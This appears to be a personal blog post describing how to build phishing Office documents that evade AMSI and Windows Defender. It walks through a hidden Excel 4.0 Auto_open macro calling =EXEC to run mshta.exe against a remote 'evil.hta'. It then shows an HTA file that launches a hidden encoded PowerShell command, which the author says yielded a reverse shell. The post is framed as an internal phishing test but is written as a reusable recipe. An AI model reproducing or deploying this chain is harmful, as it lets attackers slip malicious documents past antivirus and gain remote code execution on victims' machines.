---
layout: ../../layouts/PostLayout.astro
title: "Phishing AMSI Bypass"
date: 2020-02-25T13:07:25-05:00
draft: false
toc: false
images:
tags:
  - ASMI 
---

## How to bypass AMSI (The Simplest Way)

I was looking to run my own phishing campaigns on my current organization and was testing office document payloads.
I tried the old fashioned VBA in the macro running the shell function as well as some others, and defender caught most if not all of them.
Using this tool [Macro-Pack](https://github.com/sevagas/macro_pack) works sometimes but often, it would get flagged or the powershell command would not properly run.
I noticed that most of the issues i was running into was this AMSI popup ![asmi popup](/popup.png)

So i began researching AMSI as i never heard of it. The following resources break down AMSI and bypass options.

* [Outflank](https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/)
* [byte storm](https://medium.com/@byte_St0rm/adventures-in-the-wonderful-world-of-amsi-25d235eb749c)
* [security soup](https://security-soup.net/flawedammyy-rat-excel-4-0-macros/)
* [OutFlank2](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)

The first two explain what AMSI is and the last two go into the easier ways to bypass it. Security-Soup broke down how some actors bypassed it using excel 4.0 macros.
Aka really old macros that still work. I used the following link to get more familiar with these macros.[Excel Off The Grid](https://exceloffthegrid.com/using-excel-4-macro-functions/).
I pretty much right clicked my sheet. And clicked Excel 4.0 macro. This creates a new sheet called macro1. If you rename the first cell Auto_open it will run the sheet cell by cell. Dont forget to hide the sheet after this lol. You can run pretty much anything with the following function.
```
=EXEC("cmd.exe")
```
The issue i was running into at this point was not AMSI it was defender flagging certain lolbins like certil for example.
So i decide to look for lolbins that could potentially bypass defender since AMSI was taken care of. I came across a post here on [IronHackers](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)
That pretty much goes through alot of lolbins but what i noticed was they mentioned that. Mshta.exe doesnt get flagged.



So i found an HTA payload which contained some jscript and tried injecting that into my exec function. The macro1 sheet now looks like this

```
=EXEC("mshta.exe http://someip/evil.hta")
```
The HTA file looks like this 
```
<html>
<head>
<HTA:APPLICATION id="hwHTA"
applicationName="hyperHTA"
border="thin"
borderStyle="normal"
caption="yes"
icon="http://www.hyperwrite.com/features/favicon.ico"
maximizeButton="yes"
minimizeButton="yes"
showInTaskbar="no"
windowState="normal"
innerBorder="yes"
navigable="yes"
scroll="auto"
scrollFlat="yes"
singleInstance="yes" 
sysMenu="yes"
contextMenu="yes"
selection="yes" 
version="1.0" />

<script>
a=new ActiveXObject("WScript.Shell");
a.run("powershell -encodedCommand safdjngnrwgnwfn Blah blah blah",0,false);window.close();
</script>

<title>Simple HTML Page</title>

</head>

<body>

<h1>Dummy Page</h1>
<hr>
<p>This is a simple, common or garden variety, normal HTML page. Oh, but saved
with a .HTA extension, and with an &lt;HTA&gt; application block included at the
top of the HTML code. </p>
<p>And to make it interesting, here is a link to the <a href="http://www.aodc.com.au/" target="_top">AODC
Web site</a>.</p>
<p>And why not retrieve the version number out of the HTA:Application properties
using <a href="#" onClick="JavaScript:alert('Version of this HTA is ' + hwHTA.version)">JavaScript</a>.</p>
<p>&nbsp;</p>

</body>

</html>
```

Im not very savy to Jscript or VB so i found this online entered my own powershell encoded command into it.
And to my surprise it did not trigger defender and my reverse shell came in soon after. So with just using an old school method found with soome googling and leveraging mshta.exe you too can bypass defender as well as AMSI to get code execution.


## How to bypass AMSI (The Harder Way)
### but its more flexible and in depth
===> [Hoang Bui's Blog](https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9)

## Coming soon
### MacOS phishing tactics